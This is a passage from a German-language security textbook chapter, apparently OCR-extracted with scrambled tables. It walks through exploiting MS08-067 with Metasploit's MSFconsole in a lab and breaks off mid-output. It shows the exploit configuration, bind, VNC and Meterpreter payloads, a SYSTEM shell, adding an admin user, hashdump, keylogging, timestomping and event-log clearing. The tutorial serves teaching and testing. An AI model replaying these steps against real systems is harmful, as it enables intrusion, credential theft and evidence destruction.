-rwxr-xr-x 1 root root 2641 Nov 6 09:44 msfrpcd -rwxr-xr-x 1 root root 2085 Nov 6 08:26 msfweb drwxr-xr-x 3 root root 4096 Nov 6 10:25 plugins drwxr-xr-x 4 root root 4096 Nov 6 08:26 scripts drwxr-xr-x 5 root root 4096 Nov 6 08:25 test drwxr-xr-x 4 root root 4096 Nov 6 10:25 tools root@discordia:/opt/metasploit3/msf3#\nDas Framework stellt mit MSFconsole, MSFcli und MSFweb drei Oberfl\u00e4chen zur Verf\u00fcgung, mit denen die Exploits ausgew\u00e4hlt und eingesetzt werden k\u00f6nnen. Die Konsole MSFconsole bietet die meisten M\u00f6glichkeiten und stellt das zentrale Werkzeug im Rahmen des Frameworks dar. Die Oberfl\u00e4che MSFweb, die einen lokalen Webserver beinhaltet und sich \u00fcber einen Webbrowser bedienen l\u00e4sst, l\u00e4dt zum Ausprobieren ein und\n222\nhttp://www.metasploit.com/releases/framework-3.3.3.tar.bz2\n18.5 Der Tritt vors Schienbein: Exploits\n463\nbietet sich an f\u00fcr Live-Demonstrationen. Da sich MSFcli prim\u00e4r dem Einsatz in Skripts widmet und f\u00fcr unsere Zwecke somit auch nicht ideal erscheint, konzentrieren uns auf das bevorzugte Kommandozeilentool MSFconsole. Bevor wir das Metasploit Framework starten, ist ein Update durch msfupdate oder \u2013 noch besser \u2013 Subversion angeraten (das angebotene Zertifikat hierbei akzeptieren). root@discordia:/opt/metasploit3/msf3# /usr/local/bin/msfupdate Updating Metasploit from https://www.metasploit.com/svn/framework3/trunk... Error validating server certificate for 'https://www.metasploit.com:443': \u2013 The certificate is not issued by a trusted authority. Use the fingerprint to validate the certificate manually! Certificate information: \u2013 Hostname: metasploit.com \u2013 Valid: from Sun, 01 Apr 2007 22:02:24 GMT until Thu, 01 Apr 2010 22:02:24 GMT \u2013 Issuer: 07969287, http://certificates.godaddy.com/repository, GoDaddy.com, Inc., Scottsdale, Arizona, US \u2013 Fingerprint: 20:a7:2e:df:6d:53:10:6c:dc:2a:ca:33:fd:35:76:2c:0e:62:b1:4d (R)eject, accept (t)emporarily or accept (p)ermanently? t A plugins/auto_add_route.rb U external/source/meterpreter/source/extensions/stdapi/server/net/socket/tcp.c A external/source/meterpreter/source/extensions/stdapi/server/net/socket/udp.c A external/source/meterpreter/source/extensions/stdapi/server/net/socket/udp.h U external/source/meterpreter/source/extensions/stdapi/server/net/net.h (...) A data/exploits/php/rfi-locations.dat A data/exploits/php/README A data/exploits/CVE-2007-3314.dat A data/exploits/cmdstager A data/exploits/cmdstager/decoder_stub Updated to revision 8526. root@discordia:/opt/metasploit3/msf3#\n464\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nBeim Start des Metasploit Framework erscheint folgendes Frontend, welches mit Eingabe des Kommandos help eine kurze \u00dcbersicht zu den verf\u00fcgbaren Befehlen liefert: root@discordia:/opt/metasploit3/msf3# msfconsole _ | | o _ _ _ _ _|_ __, , _ | | __ _|_ / |/ |/ | |/ | / | / \\_|/ \\_|/ / \\_| | | | |_/|__/|_/\\_/|_/ \\/ |__/ |__/\\__/ |_/|_/ /| \\|\n=[ + -- --=[ + -- --=[ =[\nmetasploit v3.3.4-dev [core:3.3 api:1.0] 517 exploits \u2013 245 auxiliary 193 payloads \u2013 23 encoders \u2013 8 nops svn r8526 updated today (2010.02.16)\nmsf > help Core Commands ============= Command ------? back banner cd color connect exit help info irb jobs kill load loadpath quit resource route save search\nDescription ----------Help menu Move back from the current context Display an awesome metasploit banner Change the current working directory Toggle color Communicate with a host Exit the console Help menu Displays information about one or more module Drop into irb scripting mode Displays and manages jobs kill a job Load a framework plugin Searches for and loads modules from a path Exit the console Run the commands stored in a file Route traffic through a session Saves the active datastores Searches module names and descriptions\n18.5 Der Tritt vors Schienbein: Exploits\nsessions sessions set setg show sleep unload unset unsetg use version\n465\nDump session listings and display information about Sets a variable to a value Sets a global variable to a value Displays modules of a given type, or all modules Do nothing for the specified number of seconds Unload a framework plugin Unsets one or more variables Unsets one or more global variables Selects a module by name Show the framework and console library version numbers\nDatabase Backend Commands ========================= Command ------db_connect db_create db_destroy db_disconnect db_driver\nDescription ----------Connect to an existing database Create a brand new database Drop an existing database Disconnect from the current database instance Specify a database driver\nmsf >\nDas Kommando show all liefert eine \u00dcbersicht zu den im Framework enthaltenen Encoders, Nops, Exploits, Payloads und Auxiliaries, ein show exploits listet beispielsweise ausschlie\u00dflich den Schadcode: msf > show all Encoders ======== Name ---cmd/generic_sh Command Encoder cmd/ifs Encoder generic/none mipsbe/longxor mipsle/longxor (...)\nRank ---good\nDescription ----------Generic Shell Variable Substitution\nlow\nGeneric ${IFS} Substitution Command\nnormal normal normal\nThe \"none\" Encoder XOR Encoder XOR Encoder\n466\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nNOP Generators ============== Name ---armle/simple php/generic ppc/simple sparc/random tty/generic (...)\nRank ---normal normal normal normal normal\nDescription ----------Simple PHP Nop Generator Simple SPARC NOP generator TTY Nop Generator\nExploits ======== Name Rank Description ----------------aix/rpc_cmsd_opcode21 great AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow aix/rpc_ttdbserverd_realpath great ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow bsdi/softcart/mercantec_softcart great Mercantec SoftCart CGI Overflow dialup/multi/login/manyargs good System V Derived /bin/login Extraneous Arguments Buffer Overflow freebsd/tacacs/xtacacsd_report average XTACACSD\nDescription ----------Veritas Backup Veritas Backup Cisco IOS HTTP Cisco VPN IBM DB2\n18.5 Der Tritt vors Schienbein: Exploits\n469\nDie grunds\u00e4tzliche Vorgehensweise beim Einsatz der Exploits des Metasploit Frameworks gestaltet sich folgenderma\u00dfen: 1. Studium der Hintergrundinformationen zum Exploit mit info 2. Wahl eines Exploits mit use 3. Betrachtung der Optionen mit show options 4. Konfiguration der Optionen, z. B. mit set RHOST 5. Betrachtung und Konfiguration der Targets mit show targets und set TARGET 6. Betrachtung der Nutzlast mit show payload und info 7. Wahl einer Nutzlast mit set PAYLOAD 8. Konfiguration der Nutzlast durch die bei show options zu betrachtenden Parameter 9. Pr\u00fcfung, ob das Ziel f\u00fcr den ausgew\u00e4hlten Exploit verwundbar ist mit check (optional, teilweise jedoch nicht verf\u00fcgbar) 10. Start des Exploits mit exploit Wir verdeutlichen das Prozedere an einem praktischen Beispiel und bedienen uns hierbei des Rechners mit der IP-Adresse 192.168.1.213. Auf dem fraglichen Server unter Windows Server 2003 l\u00e4uft auf Port 445/TCP ein verwundbarer Netzwerkdienst, auf den uns Nmap beim NSE-Scanning hingewiesen hat (wir erinnern uns an die Meldung \u00bbMS08-067: VULNERABLE\u00ab w\u00e4hrend der Suche nach Windows-Rechnern, die nicht vom Patch MS08-067 partizipierten). Die gleiche Schw\u00e4che, durch die sich auch der Conficker-Wurm223 verbreitet, machen wir uns jetzt mit dem Framework zunutze und greifen auf den Exploit windows/ smb/ms08_067_netapi zur\u00fcck. Bei der L\u00fccke handelt es sich um einen Fehler im RPCDienst von Windows, der sich laut Fehlerbericht ausnutzen l\u00e4sst, um Code \u00fcber das Netz in ein System zu schleusen und auszuf\u00fchren. Dazu gen\u00fcgen pr\u00e4parierte RPCRequests, f\u00fcr deren Verarbeitung ein Angreifer sich unter Windows 2000, XP und Server 2003 nicht einmal beim Zielsystem authentifizieren muss.\n223\nhttp://net.cs.uni-bonn.de/wg/cs/applications/containing-conficker\n470\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nZun\u00e4chst studieren wir mit info windows/smb/ms08_067_netapi die Beschreibung zum Exploit ausf\u00fchrlich: msf > info windows/smb/ms08_067_netapi Name: Version: Platform: Privileged: License: Rank:\nMicrosoft Server Service Relative Path Stack Corruption 8479 Windows Yes Metasploit Framework License (BSD) Great\nProvided by: hdm Brett Moore Available targets: Id Name -- ---0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows XP SP2 English (NX) 4 Windows XP SP3 English (NX) 5 Windows 2003 SP0 Universal 6 Windows 2003 SP1 English (NO NX) 7 Windows 2003 SP1 English (NX) 8 Windows 2003 SP2 English (NO NX) 9 Windows 2003 SP2 English (NX) 10 Windows XP SP2 Arabic (NX) 11 Windows XP SP2 Chinese \u2013 Traditional / Taiwan (NX) 12 Windows XP SP2 Chinese \u2013 Simplified (NX) 13 Windows XP SP2 Chinese \u2013 Traditional (NX) 14 Windows XP SP2 Czech (NX) 15 Windows XP SP2 Danish (NX) 16 Windows XP SP2 German (NX) 17 Windows XP SP2 Greek (NX) 18 Windows XP SP2 Spanish (NX) 19 Windows XP SP2 Finnish (NX) 20 Windows XP SP2 French (NX) 21 Windows XP SP2 Hebrew (NX) 22 Windows XP SP2 Hungarian (NX) 23 Windows XP SP2 Italian (NX) 24 Windows XP SP2 Japanese (NX) 25 Windows XP SP2 Korean (NX)\n18.5 Der Tritt vors Schienbein: Exploits\n26\nWindows XP SP2 Dutch (NX)\n27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57\nWindows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows\nXP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP\nSP2 SP2 SP2 SP2 SP2 SP2 SP2 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3\nNorwegian (NX) Polish (NX) Portuguese \u2013 Brazilian (NX) Portuguese (NX) Russian (NX) Swedish (NX) Turkish (NX) Arabic (NX) Chinese \u2013 Traditional / Taiwan (NX) Chinese \u2013 Simplified (NX) Chinese \u2013 Traditional (NX) Czech (NX) Danish (NX) German (NX) Greek (NX) Spanish (NX) Finnish (NX) French (NX) Hebrew (NX) Hungarian (NX) Italian (NX) Japanese (NX) Korean (NX) Dutch (NX) Norwegian (NX) Polish (NX) Portuguese \u2013 Brazilian (NX) Portuguese (NX) Russian (NX) Swedish (NX) Turkish (NX)\nBasic options: Name Current Setting -----------------RHOST RPORT 445 SMBPIPE BROWSER SRVSVC) Payload information: Space: 400 Avoid: 8 characters\nRequired -------yes yes yes\nDescription ----------The target address Set the SMB service port The pipe name to use (BROWSER,\n471\n472\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDescription: This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in development. References: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-4250 http://www.osvdb.org/49243 http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx NEXPOSE (dcerpc-ms-netapi-netpathcanonicalize-dos) msf >\nSagt uns die Beschreibung zu, wechseln wir mit der Eingabe von use windows/smb/ms08_067_netapi in die spezifische Umgebung des Exploits. Alle weiteren Kommandos stehen von nun an im Kontext des Exploits. Hiernach werfen wir mit show options einen Blick auf die vom Exploit noch erforderlichen Informationen: msf > use windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) > show options Module options: Name ---RHOST RPORT SMBPIPE SRVSVC)\nCurrent Setting --------------445 BROWSER\nRequired -------yes yes yes\nExploit target: Id -0\nName ---Automatic Targeting\nmsf exploit(ms08_067_netapi) >\nDescription ----------The target address Set the SMB service port The pipe name to use (BROWSER,\n18.5 Der Tritt vors Schienbein: Exploits\n473\nDer \u00dcbersicht l\u00e4sst sich \u00fcber die Eintr\u00e4ge required entnehmen, dass wir im Vorfeld noch den Ziel-PC \u00fcber RHOST und den Zielport \u00fcber RPORT definieren m\u00fcssen. Der Zielport ist in diesem Fall nicht zwangsl\u00e4ufig erforderlich. Liefern wir keinen Wert, greift das Framework auf den vorgeschlagenen Standardport (Port 445) zur\u00fcck. Die Bestimmung des Ziel-PCs erfolgt mit set RHOST , anschlie\u00dfend lassen wir uns mit show targets die verwundbaren Ziele auflisten: msf exploit(ms08_067_netapi) > set RHOST 192.168.1.213 RHOST => 192.168.1.213 msf exploit(ms08_067_netapi) > show targets Exploit targets: Id -0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30\nName ---Automatic Targeting Windows 2000 Universal Windows XP SP0/SP1 Universal Windows XP SP2 English (NX) Windows XP SP3 English (NX) Windows 2003 SP0 Universal Windows 2003 SP1 English (NO NX) Windows 2003 SP1 English (NX) Windows 2003 SP2 English (NO NX) Windows 2003 SP2 English (NX) Windows XP SP2 Arabic (NX) Windows XP SP2 Chinese \u2013 Traditional / Taiwan (NX) Windows XP SP2 Chinese \u2013 Simplified (NX) Windows XP SP2 Chinese \u2013 Traditional (NX) Windows XP SP2 Czech (NX) Windows XP SP2 Danish (NX) Windows XP SP2 German (NX) Windows XP SP2 Greek (NX) Windows XP SP2 Spanish (NX) Windows XP SP2 Finnish (NX) Windows XP SP2 French (NX) Windows XP SP2 Hebrew (NX) Windows XP SP2 Hungarian (NX) Windows XP SP2 Italian (NX) Windows XP SP2 Japanese (NX) Windows XP SP2 Korean (NX) Windows XP SP2 Dutch (NX) Windows XP SP2 Norwegian (NX) Windows XP SP2 Polish (NX) Windows XP SP2 Portuguese \u2013 Brazilian (NX) Windows XP SP2 Portuguese (NX)\n474\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n31\nWindows XP SP2 Russian (NX)\n32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57\nWindows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows Windows\nXP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP XP\nSP2 SP2 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3 SP3\nSwedish (NX) Turkish (NX) Arabic (NX) Chinese \u2013 Traditional / Taiwan (NX) Chinese \u2013 Simplified (NX) Chinese \u2013 Traditional (NX) Czech (NX) Danish (NX) German (NX) Greek (NX) Spanish (NX) Finnish (NX) French (NX) Hebrew (NX) Hungarian (NX) Italian (NX) Japanese (NX) Korean (NX) Dutch (NX) Norwegian (NX) Polish (NX) Portuguese \u2013 Brazilian (NX) Portuguese (NX) Russian (NX) Swedish (NX) Turkish (NX)\nmsf exploit(ms08_067_netapi) >\nW\u00e4hnen wir uns sicher, das exakte Release des Ziels zu kennen (in unserem Fall die im Einsatz befindliche Version von Windows Server 2003), w\u00e4hlen wir mit set TARGET das zu verwendende Exploit-Target. Haben wir damit keinen Erfolg, ist Ausprobieren angesagt.\n18.5 Der Tritt vors Schienbein: Exploits\n475\nAnschlie\u00dfend betrachten wir mit show payloads die f\u00fcr diesen Exploit zur Verf\u00fcgung stehende Nutzlast: msf exploit(ms08_067_netapi) > set TARGET 6 TARGET => 6 msf exploit(ms08_067_netapi) > show payloads Compatible Payloads =================== Name ---generic/debug_trap Debug Trap generic/shell_bind_tcp Shell, Bind TCP Inline generic/shell_reverse_tcp Shell, Reverse TCP Inline windows/adduser net user /ADD windows/dllinject/bind_ipv6_tcp Injection, Bind TCP Stager (IPv6) (...)\nRank ---normal\nDescription ----------Generic x86\nnormal\nGeneric Command\nnormal\nGeneric Command\nnormal\nWindows Execute\nnormal\nReflective Dll\nmsf exploit(ms08_067_netapi) >\nBei der Nutzlast (Payload) handelt es sich um den Shellcode, der nach erfolgreichem Einsatz des Exploits auf dem Zielsystem ausgef\u00fchrt wird. Hierbei h\u00e4ngt es von den Vorlieben des Netzwerkforschers und der jeweiligen Situation ab, welche Nutzlast als geeignet erscheint. In vielen F\u00e4llen mag eine Bind-Shell, die Zugriff auf die Kommandozeile verschafft, zur Eroberung eines Systems v\u00f6llig ausreichen. Befindet sich das Ziel jedoch hinter einer Firewall, ist es sinnvoll, eine Nutzlast zu w\u00e4hlen, die r\u00fcckw\u00e4rts vom Ziel selbst aufgebaut wird \u2013 somit also von hinten her, z. B. in Form einer Reverse-Shell. Als weitere M\u00f6glichkeiten des Metasploit Framework stehen u. a. der ferngesteuerte Start von Kommandos, der Transfer von Programmen mit anschlie\u00dfender Ausf\u00fchrung oder die Injektion eines VNC-Servers zur Verf\u00fcgung, \u00fcber den der Angreifer anschlie\u00dfend mit einem VNC-Client auf dem \u00fcbernommenen System arbeiten kann. Ein vollkommenes Werkzeug stellt jedoch der Meterpreter dar, der nicht nur ein Set brauchbarer Grundfunktionen enth\u00e4lt, sondern sich zus\u00e4tzlich durch intelligente Verfahren erweitern l\u00e4sst. Ist das Wirtsystem einmal befallen, lassen sich \u00fcber die Kommandozeile unterschiedlichste Funktionen nachladen \u2013 je nachdem, was auf dem \u00fcbernommenen Rechner angestellt werden soll (einige dieser Erweiterungen stellen wir zu einem sp\u00e4teren Zeitpunkt exemplarisch vor).\n476\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nWer mehr \u00fcber die jeweilige Nutzlast wissen m\u00f6chte, kann mit dem Kommando info detaillierte Informationen einholen: msf exploit(ms08_067_netapi) > info windows/shell_bind_tcp Name: Version: Platform: Arch: Needs Admin: Total size: Rank:\nWindows Command Shell, Bind TCP Inline 7075 Windows x86 No 341 Normal\nProvided by: vlad902 sf Basic options: Name Current Setting -----------------EXITFUNC process LPORT 4444 RHOST\nRequired -------yes yes no\nDescription ----------Exit technique: seh, thread, process The local port The target address\nDescription: Listen for a connection and spawn a command shell\nmsf exploit(ms08_067_netapi) >\nHaben wir uns f\u00fcr eine Nutzlast entschieden, geben wir diese dem Metasploit Framework gegen\u00fcber mit set PAYLOAD bekannt: msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell_bind_tcp PAYLOAD => windows/shell_bind_tcp msf exploit(ms08_067_netapi) >\nIm zun\u00e4chst letzten Schritt kontrollieren wir mit show options sicherheitshalber die vollst\u00e4ndige Konfiguration des Exploits, um m\u00f6gliche Feinheiten der Nutzlast abzustimmen. Bei dem von uns gew\u00e4hlten Exploit gibt es beispielsweise die M\u00f6glichkeit, Werte f\u00fcr EXITFUNC und LPORT vorzugeben. In unserem Fall behalten wir die vorgeschlagenen Werte der Defaulteinstellung jedoch bei.\n18.5 Der Tritt vors Schienbein: Exploits\n477\nmsf exploit(ms08_067_netapi) > show options Module options: Name ---RHOST RPORT SMBPIPE SRVSVC)\nCurrent Setting --------------192.168.1.213 445 BROWSER\nRequired -------yes yes yes\nDescription ----------The target address Set the SMB service port The pipe name to use (BROWSER,\nPayload options (windows/shell_bind_tcp): Name ---EXITFUNC process LPORT RHOST\nCurrent Setting --------------thread\nRequired -------yes\nDescription ----------Exit technique: seh, thread,\n4444 192.168.1.213\nyes no\nThe local port The target address\nExploit target: Id -6\nName ---Windows 2003 SP1 English (NO NX)\nmsf exploit(ms08_067_netapi) >\nHaben wir den Exploit mit allen erforderlichen Informationen gef\u00fcttert, bietet sich ein Testlauf mit check an \u2013 sofern dieses Feature angeboten wird. Verl\u00e4uft der Test erfolgreich, steht einem anschlie\u00dfenden Start mit exploit nichts im Wege: msf exploit(ms08_067_netapi) > exploit [*] Started bind handler [*] Triggering the vulnerability... [*] Command shell session 1 opened (192.168.1.223:57538 -> 192.168.1.213:4444) Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp.\n478\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nC:\\WINDOWS\\system32>echo w00t! echo w00t! w00t! C:\\WINDOWS\\system32>whoami whoami nt authority\\system\nBingo! Der Prompt C:\\WINNT\\system32> l\u00e4sst unmittelbar erkennen, dass uns das Metasploit Framework eine Bind-Shell auf den Windows-Rechner er\u00f6ffnet hat und wir somit Zugriff auf die Kommandozeile haben. Das Sch\u00f6ne dabei ist, dass wir es hierbei mit einer Vielzahl an Payloads zu tun haben und so nicht ausschlie\u00dflich auf eine BindShell beschr\u00e4nkt sind. Bevorzugen wir anstelle der minimalistisch anmutenden BindShell beispielsweise eine Fernwartung, bietet sich eine VNC-Payload wie die windows/vncinject/reverse_tcp an. Erneut holen wir mit dem Kommando info Informationen ein, anschlie\u00dfend definieren wir durch die Eingabe von set PAYLOAD unsere neue Payload: msf exploit(ms08_067_netapi) > info windows/vncinject/reverse_tcp Name: Version: Platform: Arch: Needs Admin: Total size: Rank:\nVNC Server (Reflective Injection), Reverse TCP Stager 7217, 7870, 7075 Windows x86 No 290 Normal\nProvided by: sf hdm skape Basic options: Name Current Setting -----------------AUTOVNC true present EXITFUNC process LHOST LPORT 4444 VNCHOST 127.0.0.1 proxy\nRequired -------yes\nDescription ----------Automatically launch VNC viewer if\nyes yes yes yes\nExit technique: seh, thread, process The local address The local port The local host to use for the VNC\n18.5 Der Tritt vors Schienbein: Exploits\nVNCPORT\n5900\nyes\n479\nThe local port to use for the VNC proxy\nDescription: Connect back to the attacker, Inject a VNC Dll via a reflective loader\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/vncinject/bind_tcp PAYLOAD => windows/vncinject/bind_tcp msf exploit(ms08_067_netapi) >\nEin show options zeigt auf, dass die erforderlichen Parameter noch nicht vollst\u00e4ndig eingetragen sind und wir den LHOST nachpflegen m\u00fcssen. msf exploit(ms08_067_netapi) > show options Module options: Name ---RHOST RPORT SMBPIPE SRVSVC)\nCurrent Setting --------------192.168.1.213 445 BROWSER\nRequired -------yes yes yes\nDescription ----------The target address Set the SMB service port The pipe name to use (BROWSER,\nPayload options (windows/vncinject/reverse_tcp): Name ---AUTOVNC present EXITFUNC LHOST LPORT VNCHOST proxy VNCPORT proxy\nCurrent Setting --------------true\nRequired -------yes\nDescription ----------Automatically launch VNC viewer if\nthread 4444 127.0.0.1\nyes yes yes yes\nExit technique: seh, thread, process The local address The local port The local host to use for the VNC\n5900\nyes\nThe local port to use for the VNC\nExploit target: Id -6\nName ---Windows 2003 SP1 English (NO NX)\nmsf exploit(ms08_067_netapi) >\n480\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nBei LHOST handelt es sich um den Local Host \u00bbThe local address\u00ab, an dem die r\u00fcckw\u00e4rts aufzubauende VNC-Sitzung konnektiert werden soll. Die Definition des LHOST erfolgt wie gewohnt mit set LHOST : msf exploit(ms08_067_netapi) > set LHOST 192.168.1.223 LHOST => 192.168.1.223 msf exploit(ms08_067_netapi) >\nSind unsere digitalen Gesch\u00fctze korrekt geladen, erfolgt durch exploit die Z\u00fcndung. Unsere r\u00fcckseitige Fernwartung wird hierbei automatisiert aufgebaut, wenn Metasploit Framework und VNC-Viewer miteinander verzahnt sind, andernfalls ist der VNCViewer manuell auf localhost anzusetzen (somit 127.0.0.1 nebst Standard-Port TCP/5900). msf exploit(ms08_067_netapi) > exploit [*] Started reverse handler on 192.168.1.223:4444 [*] Triggering the vulnerability... [*] Sending stage (197120 bytes) [*] VNC Server session 3 opened (192.168.1.223:4444 -> 192.168.1.213:1029) [*] Starting local TCP relay on 127.0.0.1:5900... [*] Local TCP relay started. [*] Launched vnciewer in the background. [*] Session 3 created in the background. msf exploit(ms08_067_netapi) > Connected to RFB server, using protocol version 3.3 No authentication needed Desktop name \"VNCShell [SYSTEM@INTRANET] \u2013 Full Access\" VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using shared memory PutImage Same machine: preferring raw encoding ShmCleanup called\n18.5 Der Tritt vors Schienbein: Exploits\n481\nUnmittelbar danach \u00f6ffnet sich TightVNC und pr\u00e4sentiert ein Bild wie das folgende:\nBild 18.19: Metasploit erm\u00f6glicht einen VNC-Zugriff auf den Server\nDie Fernwartung auf den Windows Server 2003 ist binnen Sekunden etabliert! Der Lock-Screen braucht uns nicht weiter zu verunsichern, haben wir doch mit der Metasploit Courtesy Shell ein m\u00e4chtiges Werkzeug und k\u00f6nnen alle nur denkbaren Shell-Kommandos absetzen \u2013 die Bildschirmsperre wird beispielsweise durch die Eingabe von explorer.exe au\u00dfer Kraft gesetzt. Nat\u00fcrlich k\u00f6nnen durch die Shell auch Benutzer mit administrativen Privilegien eingerichtet werden (etwa durch net user /add gefolgt von einem net localgroup administrators /add). Eine zus\u00e4tzliche Steigerung der dunklen M\u00f6glichkeiten bietet der Meterpreter. Zun\u00e4chst w\u00e4hlen wir eine entsprechende Meterpreter-Payload, ... msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp PAYLOAD => windows/meterpreter/bind_tcp msf exploit(ms08_067_netapi) >\n...starten den Exploit und k\u00f6nnen anschlie\u00dfend durch die Shell sowohl die Verzeichnisse des fremden Servers betrachten, ...\n482\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nmsf exploit(ms08_067_netapi) > exploit [*] Started bind handler [*] Triggering the vulnerability... [*] Sending stage (747008 bytes) [*] Meterpreter session 6 opened (192.168.1.223:58599 -> 192.168.1.213:4444) meterpreter > ls c:\\ Listing: c:\\ ============ Mode ---100777/rwxrwxrwx 100666/rw-rw-rw40777/rwxrwxrwx 40777/rwxrwxrwx Settings 40777/rwxrwxrwx (...)\nSize ---0 0 0 0\nType ---fil fil dir dir\nLast modified ------------2010-02-06 21:09:10 2010-02-06 21:09:10 2010-02-13 11:05:36 2010-02-06 21:13:50\n0\ndir\n2010-02-06 22:19:11 +0100\n+0100 +0100 +0100 +0100\nmeterpreter >\n...als auch mit help die weiteren Kommandos in Erfahrung bringen: meterpreter > help Core Commands ============= Command ------? background channel close exit help interact irb migrate quit read run use write\nDescription ----------Help menu Backgrounds the current session Displays information about active channels Closes a channel Terminate the meterpreter session Help menu Interacts with a channel Drop into irb scripting mode Migrate the server to another process Terminate the meterpreter session Reads data from a channel Executes a meterpreter script Load a one or more meterpreter extensions Writes data to a channel\nName ---AUTOEXEC.BAT CONFIG.SYS Config.Msi Documents and FPSE_search\n18.5 Der Tritt vors Schienbein: Exploits\nStdapi: File system Commands ============================ Command ------cat cd del download edit getlwd getwd lcd lpwd ls mkdir pwd rm rmdir upload\nDescription ----------Read the contents of a file to the screen Change directory Delete the specified file Download a file or directory Edit a file Print local working directory Print working directory Change local working directory Print local working directory List files Make directory Print working directory Delete the specified file Remove directory Upload a file or directory\nStdapi: Networking Commands =========================== Command ------ipconfig portfwd route\nDescription ----------Display interfaces Forward a local port to a remote service View and modify the routing table\nStdapi: System Commands ======================= Command ------clearev drop_token execute getpid getprivs getuid kill\nDescription ----------Clear the event log Relinquishes any active impersonation token. Execute a command Get the current process identifier Get as many privileges as possible Get the user that the server is running as Terminate a process\n483\n484\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nps reboot reg rev2self shell shutdown steal_token process sysinfo\nList running processes Reboots the remote computer Modify and interact with the remote registry Calls RevertToSelf() on the remote machine Drop into a system command shell Shuts down the remote computer Attempts to steal an impersonation token from the target Gets information about the remote system, such as OS\nStdapi: User interface Commands =============================== Command ------enumdesktops idletime idle keyscan_dump keyscan_start keyscan_stop setdesktop uictl\nDescription ----------List all accessible desktops and window stations Returns the number of seconds the remote user has been Dump they keystroke buffer Start capturing keystrokes Stop capturing keystrokes Move to a different workstation and desktop Control some of the user interface components\nPriv: Elevate Commands ====================== Command ------getsystem\nDescription ----------Attempt to elevate your privilege to that of local system.\nPriv: Password database Commands ================================ Command ------hashdump\nDescription ----------Dumps the contents of the SAM database\nPriv: Timestomp Commands ======================== Command ------timestomp meterpreter >\nDescription ----------Manipulate file MACE attributes\n18.5 Der Tritt vors Schienbein: Exploits\n485\nOhne jedes Kommando en detail beschreiben zu wollen, sollte mittlerweile jedem klar sein, dass der Meterpreter unglaublich vielf\u00e4ltig ist. So lassen sich neben den klassischen Linux-Shell-Kommandos Dateien hoch- und herunterladen oder versteckt ausf\u00fchren (upload, download, execute -h), Keylogger starten oder stoppen keyscan start/stop), Zeitstempel manipulieren (timestomp) und zahlreiche Informationen auslesen (beispielsweise durch hashdump die SAM-Datei, die Login-Konten und verschl\u00fcsselt abgelegte Kennw\u00f6rter enth\u00e4lt). Apropos Informationen: Wer einen umfassenden \u00dcberblick zum eroberten Server w\u00fcnscht, wird das externe Meterpreter-Skript WinEnum zu sch\u00e4tzen wissen. WinEnum liefert pikante Details auf einen Schlag und legt diese in \u00fcbersichtlichen Textdateien auf dem eigenen Rechner ab. meterpreter > run winenum -h WinEnum -- Windows local enumeration Retrieves all kinds of information about the system including environment variables, network interfaces, routing, user accounts, and much more. Results are stored in /root/.msf3/logs/winenum OPTIONS: -c Change Access, Modified and Created times of executables that were run on the target machine and clear the EventLog -h Help menu. -m Migrate the Meterpreter Session from it current process to a new cmd.exe before doing anything -r Dump, compress and download entire Registry meterpreter >\nDer Start von WinEnum erfolgt durch Eingabe von run winenum -m -c \u2013r im Meterpreter: meterpreter > run winenum -m -c -r [*] Launching hidden cmd.exe... [*] Process 3820 created. [*] Current process is 